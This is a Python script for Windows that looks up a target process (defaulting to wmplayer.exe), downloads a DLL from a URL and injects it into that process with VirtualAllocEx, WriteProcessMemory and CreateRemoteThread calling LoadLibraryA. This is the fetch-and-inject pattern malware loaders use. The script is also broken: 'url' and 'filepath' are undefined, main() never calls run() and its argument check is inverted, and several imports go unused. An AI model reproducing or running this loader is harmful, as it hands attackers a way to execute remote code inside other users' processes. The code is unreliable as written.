#!/usr/bin/python
import sys
from ctypes import *
import ctypes
import inspect
import hack
import win32ui
import requests
import getpass
import zipfile, StringIO

MemWorker = hack.Pyrate()
MemWorker.GetProcesses()

def main():
    if (len(sys.argv) != 1):
        print (r"Usage: %s processname.exe" %(sys.argv[0]))
        print (r"Eg: %s wmplayer.exe" %(sys.argv[0]))
        sys.exit(0)


def run():
    processname = ""
    # get process id by searching for process name

    if len(sys.argv) > 1:
        processname = sys.argv[1]
    else:
        processname = "wmplayer.exe"
    print(MemWorker.FindProcess(processname))

    
    #retrieve dll from url

    response = requests.get(url, stream=True)
    if response.status_code == 200:
             with open(r'{0}'.format(filepath), 'wb') as f:
                     for chunk in response.iter_content(1024):
                             f.write(chunk)

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM = ( 0x1000 | 0x2000 )

    kernel32 = windll.kernel32
    pid = MemWorker.FindProcess(processname)
    dll_path = filepath

    dll_len = len(dll_path)

    # Get handle to process being injected...
    h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

    if not h_process:
        print ("[!] Couldn't get handle to PID: %s" %(pid))
        print ("[!] Are you sure %s is a valid PID?" %(pid))
        sys.exit(0)

    # Allocate space for DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # Write DLL path to allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    # Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print ("[!] Failed to inject DLL, exit...")
        sys.exit(0)

    print ("[+] Remote Thread with ID 0x%08x created." %(thread_id.value))


if __name__ == '__main__':
    main()
